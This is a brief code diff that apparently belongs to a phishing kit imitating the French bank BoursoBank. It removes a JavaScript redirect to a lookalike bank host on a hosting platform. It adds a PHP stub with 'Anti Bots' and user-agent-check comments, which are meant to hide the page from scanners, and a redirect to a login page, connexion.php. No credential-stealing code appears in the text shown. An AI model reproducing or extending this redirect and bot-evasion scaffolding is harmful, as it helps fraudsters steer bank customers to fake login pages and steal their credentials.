@@ -1,4 +1,13 @@
-<script>
-window.location.href = "https://boursobank.osc-fr1.scalingo.io/";
-</script>
+<?php
 
+session_start();
+
+# User Agent
+
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+
+# Anti Bots 
+
+# Check User-Agents
+header('location: connexion.php');
+?>
